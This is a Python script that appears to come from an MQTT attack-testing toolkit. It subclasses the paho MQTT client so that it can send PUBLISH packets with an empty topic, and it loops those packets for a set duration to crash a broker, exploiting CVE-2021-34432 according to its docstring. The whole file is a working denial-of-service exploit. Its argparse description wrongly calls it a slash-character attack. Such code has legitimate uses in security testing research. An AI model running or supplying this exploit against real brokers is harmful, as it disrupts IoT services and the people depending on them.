import argparse
import random
import mqtt_utilities as util
import paho.mqtt.client as mqtt
import time


class PoisonedClient2(mqtt.Client):

    def publish(self,
                topic: str,
                payload: mqtt.PayloadType = None,
                qos: int = 0,
                retain: bool = False,
                properties: mqtt.Properties | None = None, ) -> mqtt.MQTTMessageInfo:
        topic_bytes = topic.encode('utf-8')

        self._raise_for_invalid_topic(topic_bytes)

        if qos < 0 or qos > 2:
            raise ValueError('Invalid QoS level.')

        local_payload = mqtt._encode_payload(payload)

        if len(local_payload) > 268435455:
            raise ValueError('Payload too large.')

        local_mid = self._mid_generate()

        if qos == 0:
            info = mqtt.MQTTMessageInfo(local_mid)
            rc = self._send_publish(
                local_mid, topic_bytes, local_payload, qos, retain, False, info, properties)
            info.rc = rc
            return info
        else:
            message = mqtt.MQTTMessage(local_mid, topic_bytes)
            message.timestamp = mqtt.time_func()
            message.payload = local_payload
            message.qos = qos
            message.retain = retain
            message.dup = False
            message.properties = properties

            with self._out_message_mutex:
                if self._max_queued_messages > 0 and len(self._out_messages) >= self._max_queued_messages:
                    message.info.rc = mqtt.MQTTErrorCode.MQTT_ERR_QUEUE_SIZE
                    return message.info

                if local_mid in self._out_messages:
                    message.info.rc = mqtt.MQTTErrorCode.MQTT_ERR_QUEUE_SIZE
                    return message.info

                self._out_messages[message.mid] = message
                if self._max_inflight_messages == 0 or self._inflight_messages < self._max_inflight_messages:
                    self._inflight_messages += 1
                    if qos == 1:
                        message.state = mqtt.mqtt_ms_wait_for_puback
                    elif qos == 2:
                        message.state = mqtt.mqtt_ms_wait_for_pubrec

                    rc = self._send_publish(message.mid, topic_bytes, message.payload, message.qos, message.retain,
                                            message.dup, message.info, message.properties)

                    # remove from inflight messages so it will be send after a connection is made
                    if rc == mqtt.MQTTErrorCode.MQTT_ERR_NO_CONN:
                        self._inflight_messages -= 1
                        message.state = mqtt.mqtt_ms_publish

                    message.info.rc = rc
                    return message.info
                else:
                    message.state = mqtt.mqtt_ms_queued
                    message.info.rc = mqtt.MQTTErrorCode.MQTT_ERR_SUCCESS
                    return message.info


def main(username, password, duration=10):
    """The zero length attack sends a PUBLISH packet where the topic has length zero to cause the server to crash by exploiting CVE-2021-34432"""
    start_time = time.time()
    client = PoisonedClient2(mqtt.CallbackAPIVersion.VERSION2, protocol=mqtt.MQTTv311)
    client.username_pw_set(username, password)
    client.on_connect = util.on_connect
    client.on_disconnect = util.on_disconnect
    client.on_publish = util.on_publish

    if util.connect_client(client):
        while True:
            client.publish("", "whatever")
            print("Sent malformed PUBLISH packet")
            time.sleep(random.random() * 0.1)
            elapsed_time = time.time() - start_time
            print("Execution time: " + str(elapsed_time))
            if elapsed_time >= duration:
                print("Time elapsed, execution is terminating...", flush=True)
                client.disconnect()
                return
    else:
        print(f"Broker not reachable, ending script...", flush=True)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="launch a slash_char_dos attack from the local machine")
    parser.add_argument("-d", "--duration", type=int, help="duration in seconds")
    parser.add_argument("-u", "--username", type=str, help="username to connect as")
    parser.add_argument("-p", "--password", type=str, help="password to connect with")
    args = parser.parse_args()
    main(args.username, args.password, args.duration)
